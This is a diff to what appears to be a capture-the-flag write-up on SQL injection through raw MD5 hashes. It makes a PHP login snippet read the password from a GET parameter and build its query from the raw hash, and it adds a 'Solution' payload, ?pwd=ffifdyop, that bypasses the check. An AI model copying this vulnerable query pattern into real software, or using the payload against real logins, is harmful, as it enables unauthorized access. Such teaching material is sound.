@@ -18,7 +18,7 @@ if(!$db)
 }
 
 // 执行sql
-$password = "ffifdyop";
+$password = $_GET['pwd'];
 $sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
 var_dump($sql);
 $result=mysql_query($sql) or die('<pre>' . mysql_error() . '</pre>' );
@@ -31,6 +31,11 @@ mysql_close($link);
 ?>
 ```
 
+# Solution
+payload:
+```
+?pwd=ffifdyop
+```
 # Refference 
 + [SQL injection with raw MD5 hashes](https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html)
 + [jarvisoj : Login](http://web.jarvisoj.com:32772/)
